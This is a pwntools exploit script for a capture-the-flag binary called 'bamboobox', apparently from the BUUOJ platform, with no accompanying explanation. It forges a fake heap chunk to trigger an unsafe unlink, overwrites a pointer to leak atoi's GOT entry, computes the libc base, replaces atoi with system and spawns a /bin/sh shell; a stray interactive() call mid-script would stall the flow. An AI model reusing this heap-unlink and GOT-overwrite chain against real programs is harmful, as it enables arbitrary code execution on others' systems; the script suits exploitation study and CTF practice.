from pwn import *
#r = remote('node3.buuoj.cn',26094)
r = process('./bamboobox')
elf = ELF('./bamboobox')
libc = ELF('/libc-2.23.so')

def show():
	r.sendlineafter('Your choice:','1')

def add(size,name):
	r.sendlineafter('Your choice:','2')
	r.sendlineafter('name:',str(size))
	r.sendlineafter('item:',name)

def edit(index,size,name):
	r.sendlineafter('Your choice:','3')
	r.sendlineafter('item:',str(index))
	r.sendlineafter('name:',str(size))
	r.sendafter('item:',name)

def free(index):
	r.sendlineafter('Your choice:','4')
	r.sendlineafter('item:',str(index))

add(0x60, 'fuck')
add(0x80, 'fuck')
add(0x60, 'fuck')

ptr = 0x6020C8
fake_chunk = p64(0)#prev_size
fake_chunk += p64(0x41)#size
fake_chunk += p64(ptr - 0x18)#fd
fake_chunk += p64(ptr - 0x10)#bk
fake_chunk += p64(0)*8#padding
fake_chunk += p64(0x60)#prev_size
fake_chunk += p64(0x90)#size

edit(0, 0x80, fake_chunk)
r.interactive()
free(1)#unlink
payload = p64(0)*2+p64(0x40)+p64(elf.got['atoi'])
edit(0, 0x80, payload)
show()
r.recvuntil('0 : ')
atoi_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libc_base = atoi_addr - libc.sym['atoi']
log.success(hex(libc_base))
system = libc_base + libc.sym['system']

edit(0, 0x8, p64(system))
r.recvuntil(':')
r.sendline('/bin/sh\x00')
r.interactive()